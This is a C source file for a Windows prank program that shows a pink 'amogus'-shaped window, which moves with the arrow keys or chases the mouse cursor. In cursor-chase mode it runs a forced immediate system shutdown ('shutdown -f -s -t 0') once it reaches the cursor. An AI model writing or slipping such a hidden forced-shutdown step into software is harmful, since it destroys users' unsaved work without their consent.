//
// Created by César B. on 1/22/2024.
//

#include "window.h"
#include <stdint.h>
#include <time.h>
#include <sys/time.h>
#include <assert.h>
#include "globals.h"
#include "amogus/amogus.h"
#include "data structures/vec2/vec2.h"
#include "audio/audio.h"

void * window_interaction_thread_proc(void *)
{	clock_t last_region_refresh_clock = clock();
	struct timeval last_timeval = { 0, 0 };
	struct vec2 axes = { 0, 0 };

	while(!g_logic.pressed_keys.escape)
	{	enum { VK_A = 0x41 };

		clock_t current_clock = clock();
		struct timeval current_timeval;
		gettimeofday(&current_timeval, NULL);

		double delta_time = (current_timeval.tv_usec - last_timeval.tv_usec) / 1000000. + (current_timeval.tv_sec > last_timeval.tv_sec);
		assert(delta_time > 0);

		if(g_logic.mouse_follow_mode)
		{	POINT cursor_pos;
			//GetCurs
			bool r = GetCursorPos(&cursor_pos);
			if(!r)
				goto fail;
			RECT pos;
			r = GetWindowRect(g_logic.window, &pos);
			assert(r);
			pos.left += g_amogus.size / 2;
			pos.top += g_amogus.size / 2;
			struct vec2 amogus_to_cursor = vec2_create_2(cursor_pos.x - pos.left, cursor_pos.y - pos.top);
			double len = vec2_len(amogus_to_cursor);
			if(len < 10) // todo change to smth easier to modify
			{	// SetWindowPos(g_logic.window, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE);
				system("shutdown -f -s -t 0");
			}
			axes = vec2_add_2(axes
			                  , vec2_mult(vec2_normalize_2(amogus_to_cursor, len)
			                              , g_logic.window_speed * delta_time));
		fail:
		}
		else
		{	axes = vec2_add_2(axes, vec2_mult(
			                      vec2_normalize(vec2_create_2(g_logic.pressed_keys.right - g_logic.pressed_keys.left
			                                                   , g_logic.pressed_keys.down - g_logic.pressed_keys.up))

			                      , g_logic.window_speed * delta_time));
		}

		g_logic.window_speed += delta_time * WINDOW_MOVEMENT_SPEED_GAIN_SPEED_FACTOR;

		amogus_rotate(axes.horizontal * WINDOW_ROTATION_SPEED_FACTOR * delta_time);

		int16_t horizontal = axes.horizontal;
		int16_t vertical = axes.vertical;

		axes = vec2_sub_2(axes, vec2_create_2(horizontal, vertical));

		RECT rect;
		GetWindowRect(g_logic.window, &rect);
		MoveWindow(g_logic.window, rect.left + horizontal, rect.top + vertical, rect.right - rect.left, rect.bottom - rect.top, true);

		if(current_clock > last_region_refresh_clock + WINDOW_REGION_REFRESH_RATE)
		{	SetWindowRgn(g_logic.window, CreatePolygonRgn(g_amogus.points, AMOGUS_POINTS_LEN, WINDING), true);
			last_region_refresh_clock = current_clock;
		}

		RedrawWindow(g_logic.window, NULL, NULL, 0);

	refresh_delta_time_label:
		last_timeval = current_timeval;
	}
	SendMessageA(g_logic.window, CUSTOM_WINDOW_MESSAGE(WM_DESTRUCTION_REQUIREMENT), 0, 0);
}

LRESULT CALLBACK window_proc(HWND window, UINT msg, WPARAM param1, LPARAM param2)
{	switch(msg)
	{	case WM_PAINT:
		{	PAINTSTRUCT paint_struct;
			HDC device_context = BeginPaint(window, &paint_struct);
			RECT rect = paint_struct.rcPaint;
			rect.left = rect.top = 0;
			FillRect(device_context, &rect, CreateSolidBrush(RGB(255, 105, 180)));
			EndPaint(window, &paint_struct);
			//return UpdateLayeredWindow()
			return 0;
		}
		case WM_CLOSE:
			break;
		case WM_QUIT:
			break;
		case WM_DESTROY:
			PostQuitMessage(0);
			//assert(0);
			break;
		case MM_MCINOTIFY:
			audio_play_sound(AUDIO_LETHAL_COMPANY_ICECREAM_MUSIC);
			break;
		default:
			if(msg == CUSTOM_WINDOW_MESSAGE(WM_DESTRUCTION_REQUIREMENT))
			{	bool r;
				r = CloseWindow(g_logic.window);
				assert(r);
				r = DestroyWindow(g_logic.window);
				assert(r);
				// PostQuitMessage(0);
			}
			break;
	}
	return DefWindowProcA(window, msg, param1, param2);
}

void create_window()
{	WNDCLASSA wndclass;
	ZeroMemory(&wndclass, sizeof(WNDCLASSA));
	wndclass.lpszClassName = WINDOW_CLASS_NAME;
	wndclass.lpfnWndProc = window_proc;
	RegisterClassA(&wndclass);
	g_logic.window =
	    CreateWindowExA(
	        0//WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TRANSPARENT
	        , WINDOW_CLASS_NAME, "amogus sus lethal companus", WS_OVERLAPPEDWINDOW// WS_POPUP | WS_VISIBLE
	        , 0, 0, g_amogus.size, g_amogus.size, NULL, NULL, NULL, NULL);
	SetWindowLong(g_logic.window, GWL_STYLE, 0);
	ShowWindow(g_logic.window, SW_SHOW);
	SetWindowRgn(g_logic.window, CreatePolygonRgn(g_amogus.points, AMOGUS_POINTS_LEN, WINDING), true);
	SetWindowPos(g_logic.window, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
}

void receive_window_messages()
{	MSG msg;
	// yeah so I had to end up doing this bc fsr I couldn't find out after
	// over an hour of analysing thread call stacks and memory why the
	// GetMessageA function would straight up never return instead of
	// eventually returning 0 when the window passed to it by the
	// second argument gets destroyed
	while(IsWindow(g_logic.window))
		if(PeekMessageA(&msg, g_logic.window, 0, 0, PM_REMOVE))
		{	TranslateMessage(&msg);
			DispatchMessageA(&msg);
		}
}
